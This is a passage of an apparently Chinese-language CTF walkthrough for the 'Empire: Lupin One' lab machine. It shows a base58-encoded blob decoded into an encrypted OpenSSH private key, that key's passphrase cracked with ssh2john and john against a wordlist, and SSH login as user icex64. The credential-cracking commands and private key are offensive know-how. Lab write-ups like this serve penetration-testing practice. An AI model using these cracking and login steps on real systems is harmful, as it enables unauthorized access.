class="hljs-number">7</span>EPkbouDC<span class="hljs-number">2</span>eQd<span class="hljs-number">9</span>i<span class="hljs-number">6</span>K<span class="hljs-number">3</span>C<span class="hljs-symbol">npZHY3</span>mL<span class="hljs-number">7</span>zc<span class="hljs-name">g2</span>PHesRSj<span class="hljs-number">6</span>e<span class="hljs-number">7</span>oZBo<span class="hljs-name">M2</span>pSVTwtXRFBPTyFmUavtitoA<span class="hljs-number">8</span>kFZb<span class="hljs-number">4</span>DhYMcx<span class="hljs-symbol">NyLf7</span>r<span class="hljs-number">8</span>H<span class="hljs-number">98</span>WbtCshaEBaY<span class="hljs-number">7</span>b<span class="hljs-number">5</span>C<span class="hljs-symbol">ntvgFFEucFanfbz6</span>w<span class="hljs-number">8</span>cDyXJ<span class="hljs-symbol">nkzeW1</span>fz<span class="hljs-number">19</span><span class="hljs-symbol">Ni9</span>i<span class="hljs-number">6</span>h<span class="hljs-number">4</span>Bg<span class="hljs-meta">o6</span>BR<span class="hljs-number">8</span>Fkd<span class="hljs-number">5</span>dheH<span class="hljs-number">5</span>TGz<span class="hljs-number">47</span>VFH<span class="hljs-number">6</span>hmY<span class="hljs-number">3</span>aUgUvP<span class="hljs-number">8</span>Ai<span class="hljs-number">2</span>F<span class="hljs-number">2</span>jKFK<span class="hljs-name">g4</span>i<span class="hljs-number">3</span>HfCJHG<span class="hljs-name">g1</span>CXktuqz<span class="hljs-symbol">nVucjWmdZmuACA2</span>gce<span class="hljs-number">2</span>rpiBT<span class="hljs-number">6</span>GxmMrfSxDCiY<span class="hljs-number">32</span>axw<span class="hljs-number">2</span>QP<span class="hljs-number">7</span><span class="hljs-symbol">nzEBvCJi58</span>rVe<span class="hljs-number">8</span>JtdESt<span class="hljs-number">2</span>zHGsUga<span class="hljs-number">2</span>iySmusfpWqjY<span class="hljs-name">m8</span>kfmqTbY<span class="hljs-number">4</span>qAK<span class="hljs-number">13</span>v<span class="hljs-symbol">NMR95</span>QhXV<span class="hljs-number">9</span>VYp<span class="hljs-number">9</span>qff<span class="hljs-name">G5</span>YWY<span class="hljs-number">163</span>WJV<span class="hljs-number">5</span>urYK<span class="hljs-name">M6</span>BBiuK<span class="hljs-number">9</span>QkswCzgPtjsfFBBU<span class="hljs-meta">o6</span>vft<span class="hljs-symbol">NqCNbzQn4</span><span class="hljs-symbol">NMQmxm28</span>hDMDU<span class="hljs-number">8</span>GydwU<span class="hljs-name">m19</span>oj<span class="hljs-symbol">No1</span>scUMzGf<span class="hljs-symbol">N4</span>rLx<span class="hljs-number">7</span>bs<span class="hljs-number">3</span>S<span class="hljs-number">9</span>wYaVLDLi<span class="hljs-symbol">NeZdLLU1</span>DaKQhZ<span class="hljs-number">5</span>cFZ<span class="hljs-number">7</span>iymJHXuZFFgpbYZYFigLa<span class="hljs-number">7</span>SokXis<span class="hljs-number">1</span>LYfbHeXM<span class="hljs-attr">vcfeuApmAaGQk6</span>xmajEbpcb<span class="hljs-symbol">n1</span>H<span class="hljs-number">5</span>QQiQpYMX<span class="hljs-number">3</span>BRp<span class="hljs-number">41</span>w<span class="hljs-number">9</span>RVRuLGZ<span class="hljs-number">1</span>yLKxP<span class="hljs-number">37</span>ogcppStCvDMGfiuVMU<span class="hljs-number">5</span>SRJMajLXJBz<span class="hljs-symbol">nzRSqBYwWmf4</span>MS<span class="hljs-number">6</span>B<span class="hljs-number">57</span>xp<span class="hljs-number">56</span>jVk<span class="hljs-number">6</span>maGCsgjbuAhLyCwfG<span class="hljs-symbol">n1</span>LwLoJDQ<span class="hljs-number">1</span>kjLm<span class="hljs-symbol">nVrk7</span>FkUUESqJKjp<span class="hljs-number">5</span>cuX<span class="hljs-number">1</span>EUpFjsfU<span class="hljs-number">1</span>HaibABz<span class="hljs-number">3</span>fcYY<span class="hljs-number">2</span>cZ<span class="hljs-number">78</span>qx<span class="hljs-number">2</span>iaqS<span class="hljs-number">7</span>eP<span class="hljs-meta">o5</span>Bkwv<span class="hljs-number">5</span>XmtcLELXbQZKcHcwxkbC<span class="hljs-number">5</span>P<span class="hljs-symbol">nEP6</span>EUZRb<span class="hljs-number">3</span><span class="hljs-symbol">nqm5</span>hMDUUt<span class="hljs-number">912</span>ha<span class="hljs-number">5</span>kMR<span class="hljs-number">6</span><span class="hljs-name">g4</span>aV<span class="hljs-name">G8</span>bXFU<span class="hljs-number">6</span>a<span class="hljs-symbol">n5</span>PikaedHBRVRCygkpQj<span class="hljs-name">m8</span>Lhe<span class="hljs-number">1</span>cA<span class="hljs-number">8</span>X<span class="hljs-number">2</span>jtQiUjwveF<span class="hljs-number">5</span>bU<span class="hljs-symbol">NPmvPGk1</span>hjuP<span class="hljs-number">56</span>aWEg<span class="hljs-symbol">nyXzZkKVPbWj7</span>MQQ<span class="hljs-number">3</span>kAfqZ<span class="hljs-number">8</span>hkKD<span class="hljs-number">1</span>VgQ<span class="hljs-number">8</span>pmqayiajhFHorfgtRk<span class="hljs-number">8</span>ZpuEPpHH<span class="hljs-number">25</span>aoJf<span class="hljs-symbol">NMtY45</span>mJYjHM<span class="hljs-attr">VSVnvG9</span>e<span class="hljs-number">3</span>PHrGwrks<span class="hljs-number">1</span>eLQRXjjRmGtWu<span class="hljs-number">9</span>cwT<span class="hljs-number">2</span>bjy<span class="hljs-number">2</span>huWY<span class="hljs-number">5</span>b<span class="hljs-number">7</span>xUSAXZfmRsbkT<span class="hljs-number">3</span>eFQ<span class="hljs-symbol">nGkAHmjMZ5</span><span class="hljs-symbol">nAfmeGhshCtNjAU4</span>idu<span class="hljs-number">8</span><span class="hljs-meta">o7</span>HMmMuc<span class="hljs-number">3</span>tpK<span class="hljs-number">6</span>res<span class="hljs-number">9</span>HTC<span class="hljs-meta">o35</span>ujK<span class="hljs-number">3</span>UK<span class="hljs-number">2</span>LyMFEKjB<span class="hljs-symbol">NcXbigDWSM34</span>mXSKHA<span class="hljs-number">1</span><span class="hljs-name">M4</span>MF<span class="hljs-number">7</span>dPewvQsAkvxRTCmeWwRWz<span class="hljs-number">6</span>DKZv<span class="hljs-number">2</span>MY<span class="hljs-number">1</span>ezWd<span class="hljs-number">7</span>mLvwG<span class="hljs-meta">o9</span>ti<span class="hljs-number">9</span>SMTXrkrxHQ<span class="hljs-number">8</span>DShu<span class="hljs-symbol">NorjCzNCuxLNG9</span>ThpPgWJoFb<span class="hljs-number">1</span>sJL<span class="hljs-number">1</span>ic<span class="hljs-number">9</span>QVTvDHCJ<span class="hljs-symbol">nD1</span>AKdCjt<span class="hljs-symbol">NHrG973</span>BVZ<span class="hljs-symbol">NUF6</span>DwbFq<span class="hljs-number">5</span>d<span class="hljs-number">4</span>CTL<span class="hljs-symbol">N6</span>jxtCFs<span class="hljs-number">3</span>XmoKquzEY<span class="hljs-number">7</span>MiCzRaq<span class="hljs-number">3</span>kB<span class="hljs-symbol">NAFYNCoVxRBU3</span>d<span class="hljs-number">3</span>aXfLX<span class="hljs-number">4</span>rZXEDBfAgtumkRRmWowk<span class="hljs-symbol">Njs2</span>JDZmzS<span class="hljs-number">4</span>H<span class="hljs-number">8</span><span class="hljs-symbol">nawmMa1</span>PYmrr<span class="hljs-number">7</span>a<span class="hljs-symbol">NDPEW2</span>wdbjZurKAZhheoEYCvP<span class="hljs-number">9</span>dfqdbL<span class="hljs-number">9</span>gPrWf<span class="hljs-symbol">NBJyVBXRD8</span>EZwFZ<span class="hljs-symbol">NKb1</span>eWPh<span class="hljs-number">1</span>sYzUbPPhgruxWA<span class="hljs-symbol">NCH52</span>gQpfAT<span class="hljs-symbol">NqmtTJZFjsfpiXLQjdBxdzfz7</span>pWvK<span class="hljs-number">8</span>jivh<span class="hljs-symbol">nQaiajW3</span>pwt<span class="hljs-number">4</span>cZxwMfcrrJke<span class="hljs-number">14</span>v<span class="hljs-symbol">N8</span>Xbyqdr<span class="hljs-number">9</span>zLFjZDJ<span class="hljs-number">7</span><span class="hljs-symbol">nLdmuXTwxPwD8</span>Seoq<span class="hljs-number">2</span>hYEhR<span class="hljs-number">97</span>D<span class="hljs-symbol">nKfMY2</span>LhoWGaHoFqycPCaX<span class="hljs-number">5</span>FCP<span class="hljs-symbol">Nf9</span>CFt<span class="hljs-number">4</span><span class="hljs-symbol">n4</span><span class="hljs-symbol">nYGLau7</span>ci<span class="hljs-number">5</span>uC<span class="hljs-number">7</span>ZmssiT<span class="hljs-number">1</span>jHTjKy<span class="hljs-number">7</span>J<span class="hljs-number">9</span>a<span class="hljs-number">4</span>q<span class="hljs-number">614</span>GFDdZULTkw<span class="hljs-number">8</span>Pmh<span class="hljs-number">92</span>fuTdK<span class="hljs-number">7</span>Z<span class="hljs-number">6</span>fweY<span class="hljs-number">4</span>hZyGdUXGtPXveXwGWES<span class="hljs-number">36</span>ecCpYXPSPw<span class="hljs-number">6</span>ptVb<span class="hljs-number">9</span>RxC<span class="hljs-number">81</span>AZFPG<span class="hljs-symbol">nts85</span>PYS<span class="hljs-number">6</span>aD<span class="hljs-number">2</span>eUmge<span class="hljs-number">6</span>KGzFopMjYLma<span class="hljs-number">85</span>X<span class="hljs-number">55</span>Pu<span class="hljs-number">4</span>tCxyF<span class="hljs-number">2</span>FR<span class="hljs-number">9</span>E<span class="hljs-number">3</span>c<span class="hljs-number">2</span>zxtry<span class="hljs-name">G6</span><span class="hljs-symbol">N2</span>oVT<span class="hljs-symbol">nyZt23</span>YrEhEe<span class="hljs-number">9</span>kcCX<span class="hljs-number">59</span>RdhrDr<span class="hljs-number">71</span>Z<span class="hljs-number">3</span>zgQkAs<span class="hljs-number">8</span>uPM<span class="hljs-name">M1</span>JPvM<span class="hljs-symbol">NgdyNzpgEGGgj9</span>czgBa<span class="hljs-symbol">N5</span>PWrpPBWft<span class="hljs-name">g9</span>fte<span class="hljs-number">4</span>xYyvJ<span class="hljs-number">1</span>BF<span class="hljs-symbol">N5</span>WDvTYfhUtc<span class="hljs-symbol">n1</span>oRTDow<span class="hljs-number">67</span>w<span class="hljs-number">5</span>zz<span class="hljs-number">3</span>adjLD<span class="hljs-symbol">nXLQc6</span>MaowZJ<span class="hljs-number">2</span>zyh<span class="hljs-number">4</span>PAc<span class="hljs-number">1</span>vpstCRtKQt<span class="hljs-number">35</span>JEdwfwUe<span class="hljs-number">4</span>wz<span class="hljs-symbol">Nr3</span>sidChW<span class="hljs-number">8</span>VuMU<span class="hljs-number">1</span>Lz<span class="hljs-number">1</span>cAj<span class="hljs-attr">vcVHEp1</span>Sab<span class="hljs-meta">o8</span>FprJwJgRs<span class="hljs-number">5</span>ZPA<span class="hljs-number">7</span>Ve<span class="hljs-number">6</span>LDW<span class="hljs-number">7</span>hFa<span class="hljs-symbol">ngK8</span>YwZmRCmXxArBFVwjfV<span class="hljs-number">2</span>SjyhTjhdqswJE<span class="hljs-number">5</span><span class="hljs-symbol">nP6</span>pV<span class="hljs-symbol">nshbV8</span>Zq<span class="hljs-name">G2</span>L<span class="hljs-number">8</span>d<span class="hljs-number">1</span>cwhxpxggmu<span class="hljs-number">1</span>jByELxVHF<span class="hljs-number">1</span>C<span class="hljs-number">9</span>T<span class="hljs-number">3</span>GgLDvgUv<span class="hljs-number">8</span><span class="hljs-symbol">nc7</span>PEJYoXpCoyCs<span class="hljs-number">55</span>r<span class="hljs-number">35</span>h<span class="hljs-number">9</span>YzfKgjcJkvFTdfPHwW<span class="hljs-number">8</span>fSjCVBuUTKSEAvkRr<span class="hljs-number">6</span>iLj<span class="hljs-number">6</span>H<span class="hljs-number">4</span>LEjB<span class="hljs-name">g256</span><span class="hljs-name">G4</span>DHHqpwTgYFtejc<span class="hljs-number">8</span><span class="hljs-symbol">nLX77</span>LUoVmACLvfC<span class="hljs-number">439</span>jtVdxCtYA<span class="hljs-number">6</span>y<span class="hljs-number">2</span>vj<span class="hljs-number">7</span>ZDeX<span class="hljs-number">7</span>zp<span class="hljs-number">2</span>VYR<span class="hljs-number">89</span>GmSqEWj<span class="hljs-number">3</span>doqdahv<span class="hljs-number">1</span>DktvtQcRBiizMg<span class="hljs-symbol">NWYsjMWRM4</span>BPSc<span class="hljs-symbol">nn92</span><span class="hljs-symbol">ncLD1</span>Bw<span class="hljs-number">5</span>ioB<span class="hljs-number">8</span><span class="hljs-symbol">NyZ9</span>C<span class="hljs-symbol">NkMNk4</span>Pf<span class="hljs-number">7</span>Uqa<span class="hljs-number">7</span><span class="hljs-attr">vCTgw4</span>VJv<span class="hljs-attr">vSjE6</span>PRF<span class="hljs-symbol">nqDSrg4</span>avGUqeMUm<span class="hljs-symbol">ngc5</span>m<span class="hljs-symbol">N6</span>WEa<span class="hljs-number">3</span>pxHpkh<span class="hljs-name">G8</span>Z<span class="hljs-symbol">ngCqKvVhegBAVi7</span><span class="hljs-symbol">nDBTwukqEDeCS46</span>UczhXMFbAg<span class="hljs-symbol">nQWhExas547</span><span class="hljs-attr">vCXho71</span>gcmVqu<span class="hljs-number">2</span>x<span class="hljs-number">5</span>EAPFgJqyvMmRScQxiKrYoK<span class="hljs-number">3</span>p<span class="hljs-number">279</span>KLAyS<span class="hljs-name">M4</span>v<span class="hljs-symbol">NcRxrRrR2</span>DYQwhe<span class="hljs-number">8</span>Yj<span class="hljs-symbol">Nsf8</span>MzqjX<span class="hljs-number">54</span>mhbWcjz<span class="hljs-number">3</span>jeXoko<span class="hljs-symbol">nVk77</span>P<span class="hljs-number">9</span><span class="hljs-name">g9</span>y<span class="hljs-number">69</span>DVzJeYUvfX<span class="hljs-attr">VCjPWi7</span>aDDA<span class="hljs-number">7</span>HdQd<span class="hljs-number">2</span>UpCghEGtWSfEJtDgPxurPq<span class="hljs-number">8</span>qJQh<span class="hljs-number">3</span><span class="hljs-symbol">N75</span>YF<span class="hljs-number">8</span>KeQzJs<span class="hljs-number">77</span>Tpwcdv<span class="hljs-number">2</span>Wuvi<span class="hljs-number">1</span>L<span class="hljs-number">5</span>ZZtppbWymsgZckW<span class="hljs-symbol">nkg5</span><span class="hljs-symbol">NB9</span>Pp<span class="hljs-number">5</span>izVXCiFhobqF<span class="hljs-number">2</span>vd<span class="hljs-number">2</span>jh<span class="hljs-name">g4</span>rcpLZ<span class="hljs-symbol">nGdmmEotL7</span>CfRdVwUWpVppHRZzq<span class="hljs-number">7</span>FEQQFxkRL<span class="hljs-number">7</span>JzGoL<span class="hljs-number">8</span>R<span class="hljs-number">8</span>wQ<span class="hljs-name">G1</span>UyB<span class="hljs-symbol">NKPBbVnc7</span>jGyJqFuj<span class="hljs-attr">vCLt6</span>yMUEYXKQTipmEhx<span class="hljs-number">4</span>rXJZK<span class="hljs-number">3</span>aKdbucKhGqMYMH<span class="hljs-symbol">nVbtpLrQUaPZHsiNGUcEd64</span>KW<span class="hljs-number">5</span>kZ<span class="hljs-number">7</span>svohTC<span class="hljs-number">5</span>i<span class="hljs-number">4</span>L<span class="hljs-number">4</span>TuEzRZEyWy<span class="hljs-number">6</span>v<span class="hljs-number">2</span>GGiEp<span class="hljs-number">4</span>Mf<span class="hljs-number">2</span>oEHMUwqto<span class="hljs-symbol">NXbsGp8</span>sbJbZATFLXVbP<span class="hljs-number">3</span>PgBw<span class="hljs-number">8</span>rgAakz<span class="hljs-number">7</span>QBFAGryQ<span class="hljs-number">3</span>t<span class="hljs-symbol">nxytWNuHWkPohMMKUiDFeRyLi8</span>HGUdocwZFzdkbffv<span class="hljs-meta">o8</span>HaewPYF<span class="hljs-symbol">NsPDCn1</span>PwgS<span class="hljs-number">8</span>wA<span class="hljs-number">9</span>agCX<span class="hljs-number">5</span>kZbKWBmU<span class="hljs-number">2</span>zpCstqFAxXeQd<span class="hljs-number">8</span>LiwZzPdsbF<span class="hljs-number">2</span>YZEKz<span class="hljs-symbol">NYtckW5</span>RrFa<span class="hljs-number">5</span>zDgK<span class="hljs-name">m2</span>gSR<span class="hljs-symbol">N8</span>gHz<span class="hljs-number">3</span>WqS<br></code></pre></td></tr></table></figure>
+<p>base64 解密后是乱码，base 的都试了下，最终确定是 base58 加密：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br><span class="hljs-number">9</span>GXiytplgT9z<span class="hljs-regexp">/mP91NqOU9QoAwop5JNxhEfm/</span>j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B<span class="hljs-regexp">/PqUTODesMEV/</span>aK22UKegdwlJ9Arf+<span class="hljs-number">1</span>Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0<span class="hljs-regexp">/nRfCaOrIzPfZ/</span>NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+<span class="hljs-number">3</span>y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+<span class="hljs-number">9</span>g4U7pjtEAqYv1+<span class="hljs-number">3</span>x8F+zuiZsVdMr/<span class="hljs-number">66</span>Ma4e6iwPLqmtzt3UiFGb<br><span class="hljs-number">4</span>Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY<span class="hljs-regexp">/vMY7mtHZNCY8SeoWAxYXToKy2cu/</span>+pVyGQ76KYt3J0AT7wA<br><span class="hljs-number">2</span>OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG<span class="hljs-regexp">/b7z6zGvVxZca/g</span>572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+<span class="hljs-number">34</span>tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ<span class="hljs-regexp">/b+pdKQtBzTk5/</span>VH<span class="hljs-regexp">/Jk3QPcH69EJyx8/g</span>RE/glQY6z6nC6uoG4AkIl+gOxZ<br><span class="hljs-number">0</span>hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br><span class="hljs-number">8</span>UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+<span class="hljs-number">4</span>/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p<span class="hljs-regexp">/rHHqqPNMNwM1ns+adF7REjzFwr4/</span>trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br><span class="hljs-number">63</span>RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t<span class="hljs-regexp">/YYhQ/</span>r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+<span class="hljs-number">7</span>dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br><span class="hljs-number">8</span>nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+<span class="hljs-number">4</span>Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x<span class="hljs-regexp">/IUt/</span>FP8Nq964pD7m/dPHQ<br>E8<span class="hljs-regexp">/oh4V1NTGWrDsK3AbLk/</span>MrgROSg7Ic4BS/<span class="hljs-number">8</span>IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+<span class="hljs-number">31</span>qP80O/+Kk9NUWalsz+<span class="hljs-number">6</span>Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/<span class="hljs-number">9</span>rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br><span class="hljs-number">5</span>KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/<span class="hljs-number">4</span>m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br><span class="hljs-number">1</span>bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/<span class="hljs-number">4</span>ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br><br></code></pre></td></tr></table></figure>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>虽然提示是破解私钥，但先试一下能不能使用私钥直接登录：</p>
+<blockquote>
+<p>私钥文件权限应该为 600，且私钥文件最后要有回车</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span><br>-rw-r--r-- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>Permissions 0777 for &#x27;rsa&#x27; are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key &quot;rsa&quot;: bad permissions<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> chmod 600 rsa</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span>                        <br>-rw------- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>Load key &quot;rsa&quot;: invalid format<br>icex64@192.168.135.152&#x27;s password: <br>Permission denied, please try again.<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br></code></pre></td></tr></table></figure>
+<p>需要私钥的密码，使用 ssh2john 转换文件，并使用 john 爆破，得到密码 <code>P@55w0rd!</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/john/ssh2john.py rsa &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/fasttrack.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes<br>Cost 2 (iteration count) is 16 for all loaded hashes<br>Will run 4 OpenMP threads<br>Note: This format may emit false positives, so it will keep trying even after<br>finding a possible candidate.<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>3g 0:00:00:06 DONE (2022-07-02 06:09) 0.4360g/s 32.26p/s 32.26c/s 32.26C/s 2003..starwars<br>Session completed<br></code></pre></td></tr></table></figure>
+<p>登录 SSH：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br>Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Welcome to Empire: Lupin One<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4<br>icex64@LupinOne:~$ id<br>uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)<br></code></pre></td></tr></table></figure>
